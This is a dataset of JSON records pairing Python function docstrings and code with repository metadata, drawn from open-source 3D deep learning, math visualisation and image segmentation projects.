{"docstring": "# 2.5 means tan(fov angle)\n# tan(fov_y/2) = 2.5, fovy_y is around 45 deg\n", "func_signal": "def camera_fovy(self):\n", "code": "angle = np.arctan(1.0 / 2.5) * 2\nreturn angle", "path": "kaolin/tests/python/kaolin/render/test_camera.py", "commit_date": "2020-12-09 00:00:00", "repo_name": "NVIDIAGameWorks/kaolin", "stars": 4135, "license": "apache-2.0", "language": "python", "size": 111650}
{"docstring": "# Create temporary output directory\n", "func_signal": "def out_dir():\n", "code": "out_dir = os.path.join(os.path.dirname(os.path.realpath(__file__)), '_viz_out')\nos.makedirs(out_dir, exist_ok=True)\nyield out_dir\nshutil.rmtree(out_dir)  # Note: comment to keep output directory", "path": "kaolin/tests/python/examples/tutorial/test_visualize_main.py", "commit_date": "2020-12-09 00:00:00", "repo_name": "NVIDIAGameWorks/kaolin", "stars": 4135, "license": "apache-2.0", "language": "python", "size": 111650}
{"docstring": "# batched distance between a point and a tiangle\n", "func_signal": "def _compute_planar_dist(normal, point):\n", "code": "if normal.shape[0] == 0:\n    return normal\ndot = _compute_dot(normal, point)\ndot_div = _compute_dot(normal, normal)\nreturn dot * dot / dot_div", "path": "kaolin/kaolin/metrics/trianglemesh.py", "commit_date": "2020-12-09 00:00:00", "repo_name": "NVIDIAGameWorks/kaolin", "stars": 4135, "license": "apache-2.0", "language": "python", "size": 111650}
{"docstring": "# shape: (batch_size, 3)\n", "func_signal": "def camera_up(self, batch_size, device):\n", "code": "return torch.tensor([[0, 1, 0]], dtype=torch.float,\n                    device=device).repeat(batch_size, 1)", "path": "kaolin/tests/python/kaolin/render/test_camera.py", "commit_date": "2020-12-09 00:00:00", "repo_name": "NVIDIAGameWorks/kaolin", "stars": 4135, "license": "apache-2.0", "language": "python", "size": 111650}
{"docstring": "# if test_gradcheck passed the gradient using torch.double inputs is trustable\n", "func_signal": "def target_grad_double(self, input_double_p1, input_double_p2):\n", "code": "outputs = torch.sum(pc.sided_distance(input_double_p1, input_double_p2)[0])\noutputs.backward()\nreturn input_double_p1.grad.clone(), input_double_p2.grad.clone()", "path": "kaolin/tests/python/kaolin/metrics/test_pointcloud.py", "commit_date": "2020-12-09 00:00:00", "repo_name": "NVIDIAGameWorks/kaolin", "stars": 4135, "license": "apache-2.0", "language": "python", "size": 111650}
{"docstring": "# if test_gradcheck passed the gradient using torch.double inputs is trustable\n", "func_signal": "def target_grad_double(self, inputs_double, numel_per_tensor):\n", "code": "outputs = torch.sum(reduction._PackedSimpleSumCuda.apply(inputs_double,\n                                                        numel_per_tensor))\noutputs.backward()\nreturn inputs_double.grad.clone()", "path": "kaolin/tests/python/kaolin/ops/test_reduction.py", "commit_date": "2020-12-09 00:00:00", "repo_name": "NVIDIAGameWorks/kaolin", "stars": 4135, "license": "apache-2.0", "language": "python", "size": 111650}
{"docstring": "\"\"\"Check if :class:`torch.Tensor` is valid given set of criteria.\n\nArgs:\n    tensor (torch.Tensor): the tensor to be tested.\n    shape (list or tuple of int, optional): the expected shape,\n        if a dimension is set at ``None`` then it's not verified.\n    dtype (torch.dtype, optional): the expected dtype.\n    device (torch.device, optional): the expected device.\n\"\"\"\n", "func_signal": "def check_tensor(tensor, shape=None, dtype=None, device=None, throw=True):\n", "code": "if shape is not None:\n    if len(shape) != tensor.ndim:\n        if throw:\n            raise ValueError(f\"tensor have {tensor.ndim} ndim, should have {len(shape)}\")\n        return False\n    for i, dim in enumerate(shape):\n        if dim is not None and tensor.shape[i] != dim:\n            if throw:\n                raise ValueError(f\"tensor shape is {tensor.shape}, should be {shape}\")\n            return False\nif dtype is not None and dtype != tensor.dtype:\n    if throw:\n        raise TypeError(f\"tensor dtype is {tensor.dtype}, should be {dtype}\")\n    return False\nif device is not None and device != tensor.device.type:\n    if throw:\n        raise TypeError(f\"tensor device is {tensor.device.type}, should be {device}\")\n    return False\nreturn True", "path": "kaolin/kaolin/utils/testing.py", "commit_date": "2020-12-09 00:00:00", "repo_name": "NVIDIAGameWorks/kaolin", "stars": 4135, "license": "apache-2.0", "language": "python", "size": 111650}
{"docstring": "\"\"\"Sum of each subtensor in a packed tensor with last_dim=1.\n\nArgs:\n    tensor (torch.Tensor): The input :ref:`packed_tensor<packed>`\n    numel_per_tensor (torch.LongTensor):\n        Tensor containing the number of element per sub-tensor.\n\nReturns:\n    (torch.Tensor):\n        A 1D tensor of size ``tensor.shape[0]``,\n        containing the sum of each sub-tensor in the input tensor.\n\"\"\"\n", "func_signal": "def packed_simple_sum(tensor, numel_per_tensor):\n", "code": "assert tensor.shape[-1] == 1\nif torch.cuda.is_available() and tensor.is_cuda and not numel_per_tensor.is_cuda:\n    output = _PackedSimpleSumCuda.apply(tensor, numel_per_tensor)\nelse:\n    output = []\n    last_id = 0\n    for i, numel in enumerate(numel_per_tensor):\n        first_id = last_id\n        last_id += int(numel)\n        output.append(torch.sum(tensor[first_id:last_id]))\n    output = torch.stack(output, dim=0)\nreturn output", "path": "kaolin/kaolin/ops/reduction.py", "commit_date": "2020-12-09 00:00:00", "repo_name": "NVIDIAGameWorks/kaolin", "stars": 4135, "license": "apache-2.0", "language": "python", "size": 111650}
{"docstring": "\"\"\"\nConvenience method to format diagnostic tensor information, including\nshape, type, and optional attributes if specified as string.\nThis information can then be logged as:\nlogger.debug(tensor_info(my_tensor, 'my tensor'))\n\nLog output:\nmy_tensor: [10, 2, 100, 100] (torch.float32)\n\nArgs:\n    t: input pytorch tensor or numpy array or None\n    name: human readable name of the tensor (optional)\n    print_stats: if True, includes mean/max/min statistics (takes compute time)\n    detailed: if True, includes details about tensor properties\n\nReturns:\n    formatted string\n\"\"\"\n", "func_signal": "def tensor_info(t, name='', print_stats=False, detailed=False):\n", "code": "def _get_stats_str():\n    if torch.is_tensor(t):\n        return ' - [min %0.4f, max %0.4f, mean %0.4f]' % \\\n               (torch.min(t).item(),\n                torch.max(t).item(),\n                torch.mean(t.to(torch.float32)).item())\n    elif type(t) == np.ndarray:\n        return ' - [min %0.4f, max %0.4f, mean %0.4f]' % (np.min(t), np.max(t), np.mean(t))\n    else:\n        raise RuntimeError('Not implemented for {}'.format(type(t)))\n\ndef _get_details_str():\n    if torch.is_tensor(t):\n        return ' - req_grad={}, is_leaf={}, device={}, layout={}'.format(\n            t.requires_grad, t.is_leaf, t.device, t.layout)\n\nif t is None:\n    return '%s: None' % name\n\nshape_str = ''\nif hasattr(t, 'shape'):\n    shape_str = '%s ' % str(t.shape)\n\nif hasattr(t, 'dtype'):\n    type_str = '%s' % str(t.dtype)\nelse:\n    type_str = '{}'.format(type(t))\n\nname_str = ''\nif name is not None and len(name) > 0:\n    name_str = '%s: ' % name\n\nreturn ('%s%s(%s) %s %s' %\n        (name_str, shape_str, type_str,\n         (_get_stats_str() if print_stats else ''),\n         (_get_details_str() if detailed else '')))", "path": "kaolin/kaolin/utils/testing.py", "commit_date": "2020-12-09 00:00:00", "repo_name": "NVIDIAGameWorks/kaolin", "stars": 4135, "license": "apache-2.0", "language": "python", "size": 111650}
{"docstring": "# Test for gradient accumulation w.r.t p2\n", "func_signal": "def test_grad_check_large(self, device, dtype, get_large_input):\n", "code": "if dtype != torch.double:\n    pytest.skip(\"Gradient check only works in double.\")\n\np1, p2 = get_large_input\np1.requires_grad = True\np2.requires_grad = True\n\ngrad_result = torch.autograd.gradcheck(pc.sided_distance, (p1, p2), eps=1e-6, atol=1e-6)\n\nassert grad_result", "path": "kaolin/tests/python/kaolin/metrics/test_pointcloud.py", "commit_date": "2020-12-09 00:00:00", "repo_name": "NVIDIAGameWorks/kaolin", "stars": 4135, "license": "apache-2.0", "language": "python", "size": 111650}
{"docstring": "# if test_gradcheck passed the gradient using torch.double inputs is trustable\n", "func_signal": "def target_grad_double_large(self, get_large_input):\n", "code": "p1, p2 = get_large_input\np1 = p1.detach()\np2 = p2.detach()\np1.requires_grad = True\np2.requires_grad = True\n\noutputs = torch.sum(pc.sided_distance(p1, p2)[0])\noutputs.backward()\nreturn p1.grad.clone(), p2.grad.clone()", "path": "kaolin/tests/python/kaolin/metrics/test_pointcloud.py", "commit_date": "2020-12-09 00:00:00", "repo_name": "NVIDIAGameWorks/kaolin", "stars": 4135, "license": "apache-2.0", "language": "python", "size": 111650}
{"docstring": "\"\"\"\nThis function is used to color the faces in a checker fashion.\nWe put the domains transformed by words of even and odd length\ninto two different lists. The face may be a regular m-polygon\n(which has type 0) or an uniform 2m-polygon (which has type 1),\nwhere 2pi/m is the angle between the two mirrors.\n\"\"\"\n", "func_signal": "def get_alternative_domains(self):\n", "code": "domain1 = []\ndomain2 = []\nfor i, p in enumerate(self.coords):\n    # the two adjacent vertices and the middle points with them\n    q1 = self.coords[(i + 1) % len(self.coords)]\n    q2 = self.coords[i - 1]\n    m1 = helpers.normalize((p + q1) / 2)\n    m2 = helpers.normalize((p + q2) / 2)\n\n    if self.type:\n        if (len(self.word) + i) % 2 == 0:\n            domain1.append((m1, p, m2, self.center))\n        else:\n            domain2.append((m1, p, m2, self.center))\n\n    else:\n        if len(self.word) % 2 == 0:\n            domain1.append((m1, p, self.center))\n            domain2.append((m2, p, self.center))\n        else:\n            domain1.append((m2, p, self.center))\n            domain2.append((m1, p, self.center))\n\nreturn domain1, domain2", "path": "pywonderland/src/uniform-tilings/dihedral.py", "commit_date": "2019-12-18 00:00:00", "repo_name": "neozhaoliang/pywonderland", "stars": 4168, "license": "mit", "language": "python", "size": 17850}
{"docstring": "\"\"\"\nParameters\n----------\n:shader_files:  a list of shader files.\n:shader_type:  `GL_VERTEX_SHADER` or `GL_FRAGMENT_SHADER`.\n\nMain steps to compile and attach a shader:\n1. glCreateShader:\n    create a shader of given type.\n2. glShaderSource:\n    load source code into the shader.\n3. glCompileShader:\n    compile the shader.\n4. glGetShaderiv:\n    retrieve the compiling status.\n5. glGetShaderInfoLog:\n    print the error info if compiling failed.\n6. glAttachShader:\n    attach the shader to our program if compiling succeeded.\n\"\"\"\n", "func_signal": "def compile_and_attach_shader(self, shader_files, shader_type):\n", "code": "src = []\nfor src_f in shader_files:\n    with open(src_f, \"r\") as f:\n        src.append(f.read().encode(\"ascii\"))\n\n# 1. create a shader\nshader = gl.glCreateShader(shader_type)\n\n# 2. load source code into the shader\nsrc_p = (ct.c_char_p * len(src))(*src)\ngl.glShaderSource(\n    shader,\n    len(src),\n    ct.cast(ct.pointer(src_p), ct.POINTER(ct.POINTER(ct.c_char))),\n    None,\n)\n\n# 3. compile the shader\ngl.glCompileShader(shader)\n\n# 4. retrieve the compiling status\ncompile_status = gl.GLint(0)\ngl.glGetShaderiv(shader, gl.GL_COMPILE_STATUS, ct.byref(compile_status))\n\n# 5. if compiling failed then print the error log\nif not compile_status:\n    info_length = gl.GLint(0)\n    gl.glGetShaderiv(shader, gl.GL_INFO_LOG_LENGTH, ct.byref(info_length))\n    error_info = ct.create_string_buffer(info_length.value)\n    gl.glGetShaderInfoLog(shader, info_length, None, error_info)\n    print(error_info.value.decode(\"ascii\"))\n\n# 6. else attach the shader to our program\nelse:\n    gl.glAttachShader(self.program, shader)\n    gl.glDeleteShader(shader)", "path": "pywonderland/src/glslhelpers/shader.py", "commit_date": "2020-10-22 00:00:00", "repo_name": "neozhaoliang/pywonderland", "stars": 4168, "license": "mit", "language": "python", "size": 17850}
{"docstring": "\"\"\"`texture` must be an instance of pyglet's texture class.\n\"\"\"\n", "func_signal": "def attach_texture(self, texture):\n", "code": "gl.glFramebufferTexture2DEXT(\n    gl.GL_FRAMEBUFFER_EXT,\n    gl.GL_COLOR_ATTACHMENT0_EXT,\n    texture.target,\n    texture.id,\n    texture.level,\n)", "path": "pywonderland/src/glslhelpers/framebuffer.py", "commit_date": "2020-10-22 00:00:00", "repo_name": "neozhaoliang/pywonderland", "stars": 4168, "license": "mit", "language": "python", "size": 17850}
{"docstring": "\"\"\"\nword: the word that transforms the fundamental domain to this polygon.\nindices: the indices of the vertices of this polygon.\ncenter: coordinates of the center of this polygon.\ncoords: coordinates of the vertices of this polygon.\ntype: type of this face (0 or 1).\n\"\"\"\n", "func_signal": "def __init__(self, word, indices, center, coords, type):\n", "code": "self.word = word\nself.indices = indices\nself.center = center\nself.coords = coords\nself.type = type", "path": "pywonderland/src/uniform-tilings/dihedral.py", "commit_date": "2019-12-18 00:00:00", "repo_name": "neozhaoliang/pywonderland", "stars": 4168, "license": "mit", "language": "python", "size": 17850}
{"docstring": "\"\"\"\nDraw current tiling of `az` to a png image with matplotlib.\nMatplotlib is slower than cairo but it gives optimized results.\nThe inputs are the same with those in `render_with_cairo`.\n\"\"\"\n", "func_signal": "def render_with_matplotlib(az, imgsize, extent, filename):\n", "code": "import matplotlib.patches as mps\nimport matplotlib.pyplot as plt\n\nfig = plt.figure(figsize=(imgsize / 100.0, imgsize / 100.0), dpi=100)\nax = fig.add_axes([0, 0, 1, 1], aspect=1)\nax.axis([-extent, extent, -extent, extent])\nax.axis(\"off\")\nlinewidth = fig.dpi * fig.get_figwidth() / (20.0 * extent)\n\nfor i, j in az.cells:\n    if az.is_black(i, j) and az.tile[(i, j)] is not None:\n        if az.tile[(i, j)] == \"n\":\n            p = mps.Rectangle((i - 1, j), 2, 1, fc=N_COLOR)\n        if az.tile[(i, j)] == \"s\":\n            p = mps.Rectangle((i, j), 2, 1, fc=S_COLOR)\n        if az.tile[(i, j)] == \"w\":\n            p = mps.Rectangle((i, j), 1, 2, fc=W_COLOR)\n        if az.tile[(i, j)] == \"e\":\n            p = mps.Rectangle((i, j - 1), 1, 2, fc=E_COLOR)\n\n        p.set_linewidth(linewidth)\n        p.set_edgecolor(\"w\")\n        ax.add_patch(p)\n\nfig.savefig(filename)", "path": "pywonderland/src/aztec/random_tiling.py", "commit_date": "2020-10-22 00:00:00", "repo_name": "neozhaoliang/pywonderland", "stars": 4168, "license": "mit", "language": "python", "size": 17850}
{"docstring": "\"\"\"\nThe most simple maze animation example.\n\"\"\"\n", "func_signal": "def example1():\n", "code": "maze, surface, anim = create_animation_for_size(\n    width, height, cell_size, lw, margin\n)\nsurface.set_palette([0, 0, 0, 255, 255, 255])\nanim.pause(100)\nanim.run(algo.random_dfs, maze, speed=30, delay=5, mcl=2)\nanim.pause(500)\nanim.save(\"random_dfs.gif\")", "path": "pywonderland/src/gifmaze/example_maze_animations.py", "commit_date": "2020-10-22 00:00:00", "repo_name": "neozhaoliang/pywonderland", "stars": 4168, "license": "mit", "language": "python", "size": 17850}
{"docstring": "\"\"\"Return some statistics of the tiling.\n\"\"\"\n", "func_signal": "def get_info(self):\n", "code": "pattern = \"{}-{}-{}\".format(*self.diagram).replace(\"/\", \"|\")\ninfo = \"\"\ninfo += \"name: triangle group {}\\n\".format(pattern)\ninfo += \"cox_mat: {}\\n\".format(self.cox_mat)\ninfo += \"vertices: {}\\n\".format(self.num_vertices)\ninfo += \"edges: {}\\n\".format(self.num_edges)\ninfo += \"faces: {}\\n\".format(self.num_faces)\ninfo += \"states in the automaton: {}\\n\".format(self.G.dfa.num_states)\ninfo += \"reflection table:\\n{}\\n\".format(self.G.reftable)\ninfo += \"the automaton is saved as {}_dfa.png\".format(pattern)\nself.G.dfa.draw(pattern + \"_dfa.png\")\nreturn info", "path": "pywonderland/src/uniform-tilings/tiling.py", "commit_date": "2020-10-22 00:00:00", "repo_name": "neozhaoliang/pywonderland", "stars": 4168, "license": "mit", "language": "python", "size": 17850}
{"docstring": "\"\"\"\nCompute the Euclidean center and radius of the circle\ncentered at a point xy=(x, y) with hyperbolic radius hrad\nin the upper half plane.\n\"\"\"\n", "func_signal": "def get_euclidean_center_radius_uhp(xy, hrad):\n", "code": "x, y = xy\ny1 = y * np.exp(hrad)\ny2 = y / np.exp(hrad)\nreturn x, (y1 + y2) / 2, (y1 - y2) / 2", "path": "pywonderland/src/uniform-tilings/tiling.py", "commit_date": "2020-10-22 00:00:00", "repo_name": "neozhaoliang/pywonderland", "stars": 4168, "license": "mit", "language": "python", "size": 17850}
{"docstring": "\"\"\"\nCompute the indices of the edges.\nSteps:\n  1. Use a generator to yield a list L of words in the group.\n  2. Compute the coset representatives of the edge stabilizing\n     subgroup for words in L and remove duplicates. (So each\n     remaining representative maps to different edges)\n  3. Apply each coset representative to the ends of an initial edge\n     to get the transformed edge.\n  4. Find the indices of the resulting edge in L.\n\"\"\"\n", "func_signal": "def get_edges(self):\n", "code": "for i in self.gens:\n    if self.active[i]:\n        elist = []\n        H = (i,) + self.get_orthogonal_stabilizing_mirrors((i,))\n        reps = set(self.word_generator(parabolic=H))\n        reps = self.G.sort_words(reps)\n        for word in reps:\n            v1 = self.G.move(self.vtable, 0, word)\n            v2 = self.G.move(self.vtable, 0, word + (i,))\n            if v1 is not None and v2 is not None:\n                elist.append((v1, v2))\n\n        self.edge_indices[i] = elist\n\nself.num_edges = sum(len(L) for L in self.edge_indices.values())", "path": "pywonderland/src/uniform-tilings/tiling.py", "commit_date": "2020-10-22 00:00:00", "repo_name": "neozhaoliang/pywonderland", "stars": 4168, "license": "mit", "language": "python", "size": 17850}
{"docstring": "\"\"\"\nSet vertex attribute data in a shader, lacks the flexibility of\nsetting several attributes in one vertex buffer.\n\nParameters\n----------\n:name:  the attribute name in the shader.\n:data:  a list of vertex attributes (positions, colors, ...)\n\nExample:  name = \"positions\", data = [0, 0, 0, 1, 1, 0, 1, 1].\n\"\"\"\n", "func_signal": "def vertex_attrib(self, name, data, size=2, stride=0, offset=0):\n", "code": "data_ctype = (gl.GLfloat * len(data))(*data)\n\nvbo_id = gl.GLuint(0)\ngl.glGenBuffers(1, ct.byref(vbo_id))\ngl.glBindBuffer(gl.GL_ARRAY_BUFFER, vbo_id)\ngl.glBufferData(\n    gl.GL_ARRAY_BUFFER, ct.sizeof(data_ctype), data_ctype, gl.GL_STATIC_DRAW\n)\n\nlocation = gl.glGetAttribLocation(self.program, name.encode(\"ascii\"))\ngl.glEnableVertexAttribArray(location)\ngl.glVertexAttribPointer(\n    location, size, gl.GL_FLOAT, gl.GL_FALSE, stride, ct.c_void_p(offset)\n)\ngl.glBindBuffer(gl.GL_ARRAY_BUFFER, 0)\nreturn vbo_id", "path": "pywonderland/src/glslhelpers/shader.py", "commit_date": "2020-10-22 00:00:00", "repo_name": "neozhaoliang/pywonderland", "stars": 4168, "license": "mit", "language": "python", "size": 17850}
{"docstring": "\"\"\"\nMain steps to link the program:\n1. glLinkProgram:\n    link the shaders to create an executable\n2. glGetProgramiv:\n    retrieve the link status\n3. glGetProgramInfoLog:\n    print the error log if link failed\n\"\"\"\n", "func_signal": "def link(self):\n", "code": "gl.glLinkProgram(self.program)\n\nlink_status = gl.GLint(0)\ngl.glGetProgramiv(self.program, gl.GL_LINK_STATUS, ct.byref(link_status))\n\nif not link_status:\n    info_length = gl.GLint(0)\n    gl.glGetProgramiv(\n        self.program, gl.GL_INFO_LOG_LENGTH, ct.byref(info_length)\n    )\n    error_info = ct.create_string_buffer(info_length.value)\n    gl.glGetProgramInfoLog(self.program, info_length, None, error_info)\n    print(error_info.value)", "path": "pywonderland/src/glslhelpers/shader.py", "commit_date": "2020-10-22 00:00:00", "repo_name": "neozhaoliang/pywonderland", "stars": 4168, "license": "mit", "language": "python", "size": 17850}
{"docstring": "\"\"\"\n:param subgens: a list of generators, e.g. [0, 1]\n\nGiven a list of generators in `subgens`, return the generators that\ncommute with all of those in `subgens` and fix the initial vertex.\n\"\"\"\n", "func_signal": "def get_orthogonal_stabilizing_mirrors(self, subgens):\n", "code": "result = []\nfor s in self.gens:\n    # check commutativity\n    if all(self.cox_mat[x][s] == 2 for x in subgens):\n        # check if it fixes v0\n        if not self.active[s]:\n            result.append(s)\nreturn tuple(result)", "path": "pywonderland/src/uniform-tilings/tiling.py", "commit_date": "2020-10-22 00:00:00", "repo_name": "neozhaoliang/pywonderland", "stars": 4168, "license": "mit", "language": "python", "size": 17850}
{"docstring": "\"\"\"\nParameters\n----------\n:vert_files:  a list of files that contain the vertex shader code.\n:frag_files:  a list of files that contain the fragment shader code\n\"\"\"\n", "func_signal": "def __init__(self, vert_files, frag_files):\n", "code": "self.program = gl.glCreateProgram()\nself.compile_and_attach_shader(vert_files, gl.GL_VERTEX_SHADER)\nself.compile_and_attach_shader(frag_files, gl.GL_FRAGMENT_SHADER)\nself.link()", "path": "pywonderland/src/glslhelpers/shader.py", "commit_date": "2020-10-22 00:00:00", "repo_name": "neozhaoliang/pywonderland", "stars": 4168, "license": "mit", "language": "python", "size": 17850}
{"docstring": "\"\"\"\nThis example shows how to embed the animation into a background image.\n\"\"\"\n", "func_signal": "def example4():\n", "code": "surface = GIFSurface.from_image(\"./resources/bg.png\")\npalette = [\n    38,\n    92,\n    66,  # wall color, the same with the blackboard's\n    200,\n    200,\n    200,  # tree color\n    244,\n    25,\n    220,\n]  # path color\nfor i in range(256):\n    rgb = hls_to_rgb((i / 360.0) % 1, 0.5, 1.0)\n    palette += [int(round(255 * x)) for x in rgb]\nsurface.set_palette(palette)\nsize = (surface.width, surface.height)\nmask = generate_text_mask(size, \"UST\", \"./resources/ubuntu.ttf\", 300)\nmaze = Maze(60, 38, mask=mask).scale(3).translate((50, 35)).setlinewidth(3)\nanim = Animation(surface)\nanim.pause(100, trans_index=1)\nanim.paint(48, 32, 361, 231, 0)  # paint the blackboard region\nanim.pause(100)\nanim.run(algo.wilson, maze, speed=50, delay=2, trans_index=None, mcl=2)\nanim.pause(300)\ncmap = {i: max(i % 256, 3) for i in range(len(maze.cells))}\ncmap.update({0: 0, 1: 0, 2: 2})\nanim.run(algo.bfs, maze, speed=30, mcl=8, delay=5, cmap=cmap, trans_index=0)\nanim.pause(500)\nanim.save(\"wilson-bfs.gif\")", "path": "pywonderland/src/gifmaze/example_maze_animations.py", "commit_date": "2020-10-22 00:00:00", "repo_name": "neozhaoliang/pywonderland", "stars": 4168, "license": "mit", "language": "python", "size": 17850}
{"docstring": "\"\"\"\nThis example shows how to insert a background image at the beginning\nof the gif file while the animation is running.\n\"\"\"\n", "func_signal": "def example3():\n", "code": "maze, surface, anim = create_animation_for_size(\n    width, height, cell_size, lw, margin\n)\nsurface.set_palette(\n    [0, 0, 0, 255, 255, 255, 50, 50, 50, 150, 200, 100, 255, 0, 255]\n)\nanim.pause(100)\nanim.run(algo.prim, maze, speed=30, delay=5, trans_index=0, mcl=2)\nanim.pause(300)\nanim.insert_frame(encode_maze(maze, cmap={1: 2}, mcl=2))\nanim.run(algo.dfs, maze, speed=10, trans_index=0, cmap={1: 1, 2: 4}, mcl=3)\nanim.pause(500)\nanim.save(\"prim-dfs.gif\")", "path": "pywonderland/src/gifmaze/example_maze_animations.py", "commit_date": "2020-10-22 00:00:00", "repo_name": "neozhaoliang/pywonderland", "stars": 4168, "license": "mit", "language": "python", "size": 17850}
{"docstring": "\"\"\"\nCompute line strips for drawing edges of different types.\nk must be either 1 or 2.\n\"\"\"\n", "func_signal": "def divide_line(hwidth, k):\n", "code": "ewidth = np.tanh(hwidth / 2)\nif k == 1:\n    x = 2 * np.arctanh(ewidth / 6)\n    return x\nelse:\n    x1 = 2 * np.arctanh(ewidth / 10)\n    x2 = 2 * np.arctanh(ewidth / 10 * 3)\n    return x1, x2", "path": "pywonderland/src/uniform-tilings/tiling.py", "commit_date": "2020-10-22 00:00:00", "repo_name": "neozhaoliang/pywonderland", "stars": 4168, "license": "mit", "language": "python", "size": 17850}
{"docstring": "\"\"\"\n:param program: must be either cairo or matplotlib.\n\"\"\"\n", "func_signal": "def render(program, *args, **kwargs):\n", "code": "if program == \"cairo\":\n    render_with_cairo(*args, **kwargs)\nelif program == \"matplotlib\":\n    render_with_matplotlib(*args, **kwargs)\nelse:\n    raise ValueError(\"Program must be cairo or matplotlib!\")", "path": "pywonderland/src/aztec/random_tiling.py", "commit_date": "2020-10-22 00:00:00", "repo_name": "neozhaoliang/pywonderland", "stars": 4168, "license": "mit", "language": "python", "size": 17850}
{"docstring": "\"\"\"\nCompute the Euclidean center and radius of the circle\ncentered at a point P with hyperbolic radius hrad.\nP is an instance of `Point` from the hyperbolic module.\n\"\"\"\n", "func_signal": "def get_euclidean_center_radius(P, hrad):\n", "code": "r1 = np.tanh((P.hr + hrad) / 2)\nr2 = np.tanh((P.hr - hrad) / 2)\nR = (r1 + r2) / 2\nr = (r1 - r2) / 2\nreturn R * np.cos(P.theta), R * np.sin(P.theta), r", "path": "pywonderland/src/uniform-tilings/tiling.py", "commit_date": "2020-10-22 00:00:00", "repo_name": "neozhaoliang/pywonderland", "stars": 4168, "license": "mit", "language": "python", "size": 17850}
{"docstring": "\"\"\"\nThis example shows how to use a mask image in the maze.\n\"\"\"\n", "func_signal": "def example2():\n", "code": "_, surface, anim = create_animation_for_size(width, height, cell_size, lw, margin)\nsurface.set_palette([0, 0, 0, 255, 255, 255])\nmask = generate_text_mask(\n    (surface.width, surface.height), \"UNIX\", \"./resources/ubuntu.ttf\", 280\n)\nmaze = (\n    Maze(width, height, mask=mask)\n    .scale(cell_size)\n    .translate((margin, margin))\n    .setlinewidth(lw)\n)\nanim.pause(100)\nanim.run(algo.kruskal, maze, speed=30, delay=5, mcl=2)\nanim.pause(500)\nanim.save(\"kruskal.gif\")", "path": "pywonderland/src/gifmaze/example_maze_animations.py", "commit_date": "2020-10-22 00:00:00", "repo_name": "neozhaoliang/pywonderland", "stars": 4168, "license": "mit", "language": "python", "size": 17850}
{"docstring": "\"\"\"Postpone the actual computations to this method.\n\"\"\"\n", "func_signal": "def build_geometry(self, depth=None, maxcount=20000):\n", "code": "self.G.init()\nself.word_generator = partial(self.G.traverse, depth=depth, maxcount=maxcount)\nself.get_vertices()\nself.get_edges()\nself.get_faces()\nreturn self", "path": "pywonderland/src/uniform-tilings/tiling.py", "commit_date": "2020-10-22 00:00:00", "repo_name": "neozhaoliang/pywonderland", "stars": 4168, "license": "mit", "language": "python", "size": 17850}
{"docstring": "\"\"\"Convert the model into training mode while keep normalization layer\nfreezed.\"\"\"\n", "func_signal": "def train(self, mode=True):\n", "code": "super(UNet, self).train(mode)\nif mode and self.norm_eval:\n    for m in self.modules():\n        # trick: eval have effect on BatchNorm only\n        if isinstance(m, _BatchNorm):\n            m.eval()", "path": "mmsegmentation/mmseg/models/backbones/unet.py", "commit_date": "2020-10-21 00:00:00", "repo_name": "open-mmlab/mmsegmentation", "stars": 7159, "license": "apache-2.0", "language": "python", "size": 45261}
{"docstring": "\"\"\"Forward function.\"\"\"\n", "func_signal": "def forward(self, inputs):\n", "code": "inputs = self._transform_inputs(inputs)\n\nx = inputs[-1]\n\nx = self.aspp_conv(x) * resize(\n    self.image_pool(x),\n    size=x.size()[2:],\n    mode='bilinear',\n    align_corners=self.align_corners)\nx = self.conv_up_input(x)\n\nfor i in range(len(self.branch_channels) - 1, -1, -1):\n    x = resize(\n        x,\n        size=inputs[i].size()[2:],\n        mode='bilinear',\n        align_corners=self.align_corners)\n    x = torch.cat([x, self.convs[i](inputs[i])], 1)\n    x = self.conv_ups[i](x)\n\nreturn self.cls_seg(x)", "path": "mmsegmentation/mmseg/models/decode_heads/lraspp_head.py", "commit_date": "2020-12-26 00:00:00", "repo_name": "open-mmlab/mmsegmentation", "stars": 7159, "license": "apache-2.0", "language": "python", "size": 45261}
{"docstring": "\"\"\"Forward function.\"\"\"\n\n", "func_signal": "def forward(self, x):\n", "code": "if self.with_cp and x.requires_grad:\n    out = cp.checkpoint(self.interp_upsample, x)\nelse:\n    out = self.interp_upsample(x)\nreturn out", "path": "mmsegmentation/mmseg/models/backbones/unet.py", "commit_date": "2020-10-21 00:00:00", "repo_name": "open-mmlab/mmsegmentation", "stars": 7159, "license": "apache-2.0", "language": "python", "size": 45261}
{"docstring": "\"\"\"Forward function.\"\"\"\n", "func_signal": "def forward(self, x):\n", "code": "ppm_outs = []\nfor ppm in self:\n    ppm_out = ppm(x)\n    upsampled_ppm_out = resize(\n        ppm_out,\n        size=x.size()[2:],\n        mode='bilinear',\n        align_corners=self.align_corners)\n    ppm_outs.append(upsampled_ppm_out)\nreturn ppm_outs", "path": "mmsegmentation/mmseg/models/decode_heads/psp_head.py", "commit_date": "2020-07-09 00:00:00", "repo_name": "open-mmlab/mmsegmentation", "stars": 7159, "license": "apache-2.0", "language": "python", "size": 45261}
{"docstring": "\"\"\"Initialize the weights in backbone.\n\nArgs:\n    pretrained (str, optional): Path to pre-trained weights.\n        Defaults to None.\n\"\"\"\n", "func_signal": "def init_weights(self, pretrained=None):\n", "code": "if isinstance(pretrained, str):\n    logger = get_root_logger()\n    load_checkpoint(self, pretrained, strict=False, logger=logger)\nelif pretrained is None:\n    for m in self.modules():\n        if isinstance(m, nn.Conv2d):\n            kaiming_init(m)\n        elif isinstance(m, (_BatchNorm, nn.GroupNorm)):\n            constant_init(m, 1)\nelse:\n    raise TypeError('pretrained must be a str or None')", "path": "mmsegmentation/mmseg/models/backbones/unet.py", "commit_date": "2020-10-21 00:00:00", "repo_name": "open-mmlab/mmsegmentation", "stars": 7159, "license": "apache-2.0", "language": "python", "size": 45261}
{"docstring": "\"\"\"Forward function.\"\"\"\n\n", "func_signal": "def forward(self, x):\n", "code": "if self.with_cp and x.requires_grad:\n    out = cp.checkpoint(self.deconv_upsamping, x)\nelse:\n    out = self.deconv_upsamping(x)\nreturn out", "path": "mmsegmentation/mmseg/models/backbones/unet.py", "commit_date": "2020-10-21 00:00:00", "repo_name": "open-mmlab/mmsegmentation", "stars": 7159, "license": "apache-2.0", "language": "python", "size": 45261}
